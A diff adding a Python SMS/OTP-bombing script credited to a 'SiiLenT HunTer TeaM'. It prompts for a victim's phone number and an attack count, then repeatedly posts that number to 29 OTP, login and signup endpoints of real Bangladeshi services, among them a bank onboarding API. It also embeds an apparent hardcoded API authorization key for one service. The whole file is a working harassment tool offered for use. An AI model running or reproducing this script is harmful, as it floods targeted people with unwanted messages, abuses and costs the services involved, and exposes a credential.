@@ -1,0 +1,409 @@
+import requests
+from requests.structures import CaseInsensitiveDict
+import os
+print("open")
+os.system('clear')
+
+
+
+# Bold High Intensty
+biblack="\033[1;90m"      # Black
+bired="\033[1;91m"        # Red
+bigreen="\033[1;92m"      # Green
+biyellow="\033[1;93m"     # Yellow
+biblue="\033[1;94m"       # Blue
+bipurple="\033[1;95m"     # Purple
+bicyan="\033[1;96m"       # Cyan
+biehite="\033[1;97m"      # White
+
+
+import os
+import sys
+ 
+ 
+print(bigreen+"""
+´´´´´´´´´´´´´´´´´´´ ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´´´´´´´´´´´´´´`
+´´´´´´´´´´´´´´´´´¶¶¶¶¶¶´´´´´´´´´´´´´¶¶¶¶¶¶¶´´´´´´´´´´´´´´´´
+´´´´´´´´´´´´´´¶¶¶¶´´´´´´´´´´´´´´´´´´´´´´´¶¶¶¶´´´´´´´´´´´´´´
+´´´´´´´´´´´´´¶¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´´´´´´´´´´´
+´´´´´´´´´´´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´´´´´´´´´´
+´´´´´´´´´´´¶¶´´´´´´´´´´´´´´´´´´´´´`´´´´´´´´´´´¶¶´´´´´´´´´´`
+´´´´´´´´´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´´´´´´´´´
+´´´´´´´´´´¶¶´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´¶¶´´´´´´´´´´
+´´´´´´´´´´¶¶´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶´´´´´´´´´´
+´´´´´´´´´´¶¶´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶´´´´´´´´´´
+´´´´´´´´´´¶¶´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´¶¶´´´´´´´´´´
+´´´´´´´´´´¶¶´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶¶´´´´´´´´´´
+´´´´´´´´´´´¶¶´¶¶´´´¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶´´´¶¶´¶¶´´´´´´´´´´´
+´´´´´´´´´´´´¶¶¶¶´¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶´¶¶¶¶¶´´´´´´´´´´´
+´´´´´´´´´´´´´¶¶¶´¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶´¶¶¶´´´´´´´´´´´´´
+´´´´¶¶¶´´´´´´´¶¶´´¶¶¶¶¶¶¶¶´´´´´´´¶¶¶¶¶¶¶¶¶´´¶¶´´´´´´¶¶¶¶´´´
+´´´¶¶¶¶¶´´´´´¶¶´´´¶¶¶¶¶¶¶´´´¶¶¶´´´¶¶¶¶¶¶¶´´´¶¶´´´´´¶¶¶¶¶¶´´
+´´¶¶´´´¶¶´´´´¶¶´´´´´¶¶¶´´´´¶¶¶¶¶´´´´¶¶¶´´´´´¶¶´´´´¶¶´´´¶¶´´
+´¶¶¶´´´´¶¶¶¶´´¶¶´´´´´´´´´´¶¶¶¶¶¶¶´´´´´´´´´´¶¶´´¶¶¶¶´´´´¶¶¶´
+¶¶´´´´´´´´´¶¶¶¶¶¶¶¶´´´´´´´¶¶¶¶¶¶¶´´´´´´´¶¶¶¶¶¶¶¶¶´´´´´´´´¶¶
+¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶´´´´¶¶¶¶¶¶¶´´´´¶¶¶¶¶¶¶¶´´´´´´¶¶¶¶¶¶¶¶
+´´¶¶¶¶´¶¶¶¶¶´´´´´´¶¶¶¶¶´´´´´´´´´´´´´´¶¶¶´¶¶´´´´´¶¶¶¶¶¶´¶¶¶´
+´´´´´´´´´´¶¶¶¶¶¶´´¶¶¶´´¶¶´´´´´´´´´´´¶¶´´¶¶¶´´¶¶¶¶¶¶´´´´´´´´
+´´´´´´´´´´´´´´¶¶¶¶¶¶´¶¶´¶¶¶¶¶¶¶¶¶¶¶´¶¶´¶¶¶¶¶¶´´´´´´´´´´´´´´
+´´´´´´´´´´´´´´´´´´¶¶´¶¶´¶´¶´¶´¶´¶´¶´¶´¶´¶¶´´´´´´´´´´´´´´´´´
+´´´´´´´´´´´´´´´´¶¶¶¶´´¶´¶´¶´¶´¶´¶´¶´¶´´´¶¶¶¶¶´´´´´´´´´´´´´´
+´´´´´´´´´´´´¶¶¶¶¶´¶¶´´´¶¶¶¶¶¶¶¶¶¶¶¶¶´´´¶¶´¶¶¶¶¶´´´´´´´´´´´´
+´´´´¶¶¶¶¶¶¶¶¶¶´´´´´¶¶´´´´´´´´´´´´´´´´´¶¶´´´´´´¶¶¶¶¶¶¶¶¶´´´´
+´´´¶¶´´´´´´´´´´´¶¶¶¶¶¶¶´´´´´´´´´´´´´¶¶¶¶¶¶¶¶´´´´´´´´´´¶¶´´´
+´´´´¶¶¶´´´´´¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶´´´´´¶¶¶´´´´
+´´´´´´¶¶´´´¶¶¶´´´´´´´´´´´¶¶¶¶¶¶¶¶¶´´´´´´´´´´´¶¶¶´´´¶¶´´´´´´
+´´´´´´¶¶´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶¶´´´´´´
+´´´´´´´¶¶¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶¶¶´´´´´´´
+ 
+             
+                                  """)
+
+
+
+
+    
+
+
+  
+
+print ("	 -!-!- WeLcOmE-!-!- (SiiLenT HunTer TeaM ) ")
+
+print ("	 -!-!- WeLcOmE-!-!- ( HD-PuDiNa ) ( @##MrPuD!!Na##@ ) ")
+
+
+
+
+number  = str(input("[>] Hey Mr : PuDiNa Sir. apNar aTTack NumBer DiN: "))
+
+
+amount = int(input("[>] PuDiNA Sir apNar aTTack ar PoriMaN LikHuN: "))
+
+
+url1 = "http://nesco.sslwireless.com:80/api/v1/login"
+
+headers1 = CaseInsensitiveDict()
+headers1["Content-Type"] = "application/x-www-form-urlencoded"
+
+data1 = "phone_number="+number
+
+
+url2 = "http://27.131.15.19/lstyle/api/lsotprequest"
+
+headers2 = CaseInsensitiveDict()
+
+headers2["Content-Length"]="48"
+
+headers2["Content-Type"]="application/json;charset=utf-8"
+
+data2 = """{
+  \"shortcode\": \"2494905\",
+  \"msisdn\": \"88"""+number+"""\"
+}"""
+
+
+
+
+
+url3 = "https://prodapi.swap.com.bd/api/v1/send-otp/login"
+
+headers3 = CaseInsensitiveDict()
+
+headers3["X-Authorization"]= "QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3"
+
+headers3["Content-Type"] = "application/json"
+
+data3 = '{"mobile_number":"'+number+'","referral":false}'
+
+url4 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"
+
+headers4 = CaseInsensitiveDict()
+
+headers4["Content-Type"]="application/json; charset=UTF-8"
+
+data4 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'
+
+
+url5 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"
+
+headers5 = CaseInsensitiveDict()
+
+headers5["Content-Type"]="application/json; charset=UTF-8"
+
+data5 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'
+
+url6 = "http://nesco.sslwireless.com:80/api/v1/login"
+
+headers6 = CaseInsensitiveDict()
+headers6["Content-Type"] = "application/x-www-form-urlencoded"
+
+data6 = "phone_number="+number
+
+url7 = "http://nesco.sslwireless.com:80/api/v1/login"
+
+headers7 = CaseInsensitiveDict()
+headers1["Content-Type"] = "application/x-www-form-urlencoded"
+
+data7 = "phone_number="+number
+
+
+url8 = "http://nesco.sslwireless.com:80/api/v1/login"
+
+headers8 = CaseInsensitiveDict()
+headers8["Content-Type"] = "application/x-www-form-urlencoded"
+
+data8 = "phone_number="+number
+
+url9 = "http://nesco.sslwireless.com:80/api/v1/login"
+
+headers9 = CaseInsensitiveDict()
+headers9["Content-Type"] = "application/x-www-form-urlencoded"
+
+data9 = "phone_number="+number
+
+url10 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"
+
+headers10 = CaseInsensitiveDict()
+
+headers10["Content-Type"]="application/json; charset=UTF-8"
+
+data10 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'
+
+url11 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"
+
+headers11 = CaseInsensitiveDict()
+
+headers11["Content-Type"]="application/json; charset=UTF-8"
+
+data11 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'
+
+
+url12 = "https://ss.binge.buzz/otp/send/login"
+
+headers12 = CaseInsensitiveDict()
+headers12["Content-Type"] = "application/x-www-form-urlencoded"
+
+data12 = "phone="+number
+
+
+url13 = "https://ss.binge.buzz/otp/send/login"
+
+headers13 = CaseInsensitiveDict()
+headers13["Content-Type"] = "application/x-www-form-urlencoded"
+
+data13 = "phone="+number
+
+url14 = "https://ss.binge.buzz/otp/send/login"
+
+headers14 = CaseInsensitiveDict()
+headers14["Content-Type"] = "application/x-www-form-urlencoded"
+
+data14 = "phone="+number
+
+
+url15 = "https://monarchmart.com/api/v2/auth/signup"
+headers15 = CaseInsensitiveDict()
+headers15["Content-Type"] = "application/json"
+
+data15 = """{\"name\":\"\",\"email_or_phone\":\"+88"""+number+"""\",\"pass word\":\"\",\"register_by\":\"phone\"}"""
+
+url16 = "https://monarchmart.com/api/v2/auth/signup"
+headers16 = CaseInsensitiveDict()
+headers16["Content-Type"] = "application/json"
+
+data16 = """{\"name\":\"\",\"email_or_phone\":\"+88"""+number+"""\",\"pass word\":\"\",\"register_by\":\"phone\"}"""
+
+url17 = "https://monarchmart.com/api/v2/auth/signup"
+headers17 = CaseInsensitiveDict()
+headers17["Content-Type"] = "application/json"
+
+data17 = """{\"name\":\"\",\"email_or_phone\":\"+88"""+number+"""\",\"pass word\":\"\",\"register_by\":\"phone\"}"""
+
+url18 = "https://monarchmart.com/api/v2/auth/signup"
+headers18 = CaseInsensitiveDict()
+headers18["Content-Type"] = "application/json"
+
+data18 = """{\"name\":\"\",\"email_or_phone\":\"+88"""+number+"""\",\"pass word\":\"\",\"register_by\":\"phone\"}"""
+
+url19 = "https://monarchmart.com/api/v2/auth/signup"
+headers19 = CaseInsensitiveDict()
+headers19["Content-Type"] = "application/json"
+
+data19 = """{\"name\":\"\",\"email_or_phone\":\"+88"""+number+"""\",\"pass word\":\"\",\"register_by\":\"phone\"}"""
+
+url20 = "https://monarchmart.com/api/v2/auth/signup"
+headers20 = CaseInsensitiveDict()
+headers20["Content-Type"] = "application/json"
+
+data20 = """{\"name\":\"\",\"email_or_phone\":\"+88"""+number+"""\",\"pass word\":\"\",\"register_by\":\"phone\"}"""
+
+url21 = "https://shopup.com.bd/users/send_user_otp.json"
+
+headers21 = CaseInsensitiveDict()
+headers21["Content-Type"] = "application/json"
+
+data21 = '{"user":{"login":"88'+number+'","resend":false,"type":{"register":true}},"direct_login":true}'
+
+url22 = "https://shopup.com.bd/users/send_user_otp.json"
+
+headers22 = CaseInsensitiveDict()
+headers22["Content-Type"] = "application/json"
+
+data22 = '{"user":{"login":"88'+number+'","resend":false,"type":{"register":true}},"direct_login":true}'
+
+
+
+
+
+url23 = "https://shopup.com.bd/users/send_user_otp.json"
+
+headers23 = CaseInsensitiveDict()
+headers23["Content-Type"] = "application/json"
+
+data23 = '{"user":{"login":"88'+number+'","resend":false,"type":{"register":true}},"direct_login":true}'
+
+url24 = "https://shopup.com.bd/users/send_user_otp.json"
+
+headers24 = CaseInsensitiveDict()
+headers24["Content-Type"] = "application/json"
+
+data24 = '{"user":{"login":"88'+number+'","resend":false,"type":{"register":true}},"direct_login":true}'
+
+url25 = "https://shopup.com.bd/users/send_user_otp.json"
+
+headers25 = CaseInsensitiveDict()
+headers25["Content-Type"] = "application/json"
+
+data25 = '{"user":{"login":"88'+number+'","resend":false,"type":{"register":true}},"direct_login":true}'
+
+
+url26 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"
+
+headers26 = CaseInsensitiveDict()
+
+headers26["Content-Type"]="application/json; charset=UTF-8"
+
+data26 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'
+
+url27 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"
+
+headers27 = CaseInsensitiveDict()
+
+headers27["Content-Type"]="application/json; charset=UTF-8"
+
+data27 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'
+
+url28 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"
+
+headers28 = CaseInsensitiveDict()
+
+headers28["Content-Type"]="application/json; charset=UTF-8"
+
+data28 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'
+
+url29 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"
+
+headers29 = CaseInsensitiveDict()
+
+headers29["Content-Type"]="application/json; charset=UTF-8"
+
+data29 = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+for i in range(amount):
+	try:
+		resp1 = requests.post(url1, headers=headers1, data=data1)
+
+		
+		resp2 = requests.post(url2, headers=headers2, data=data2)				
+								
+	
+		
+		resp3 = requests.post(url3, headers=headers3, data=data3)
+		
+		resp4 = requests.post(url4, headers=headers4, data=data4)
+
+		resp5 = requests.post(url5, headers=headers5, data=data5)
+		
+		resp6 = requests.post(url6, headers=headers5, data=data6)
+		
+		resp7 = requests.post(url7, headers=headers7, data=data7)
+		
+		resp8 = requests.post(url8, headers=headers8, data=data8)
+		
+		resp9 = requests.post(url9, headers=headers9, data=data9)
+		
+		resp10 = requests.post(url10, headers=headers10, data=data10)
+		
+		resp11 = requests.post(url11, headers=headers11, data=data11)
+		
+		resp12 = requests.post(url12, headers=headers12, data=data12)
+		
+		resp13 = requests.post(url13, headers=headers13, data=data13)
+		
+		resp14 = requests.post(url14, headers=headers14, data=data14)
+		
+		
+		
+		resp15 = requests.post(url15, headers=headers15, data = data15)
+		
+		resp16 = requests.post(url16, headers=headers16, data = data16)
+		
+		resp17 = requests.post(url17, headers=headers17, data = data17)
+		
+		resp18 = requests.post(url18, headers=headers18, data = data18)
+		
+		resp19 = requests.post(url19, headers=headers19, data = data19)
+		
+		resp20 = requests.post(url20, headers=headers20, data = data20)
+		
+		resp21 = requests.post(url21, headers=headers21, data=data21)
+
+		
+		resp22 = requests.post(url22, headers=headers22, data=data22)				
+		resp23 = requests.post(url23, headers=headers23, data=data23)
+		
+		resp24 = requests.post(url24, headers=headers24, data=data24)
+
+		resp25 = requests.post(url25, headers=headers25, data=data25)
+		
+		resp26 = requests.post(url26, headers=headers25, data=data26)
+		
+		resp27 = requests.post(url27, headers=headers27, data=data27)
+		
+		resp28 = requests.post(url28, headers=headers28, data=data28)
+		
+		resp29 = requests.post(url29, headers=headers29, data=data29)						
+	
+		
+		
+		
+		
+		
+		
+		
+		print(str (i+1)+"  PuDiNa SiiR PiiN SeNT HoYeChE \n")
+	except:
+		print ("Please Make Sure Your Internet Connection")
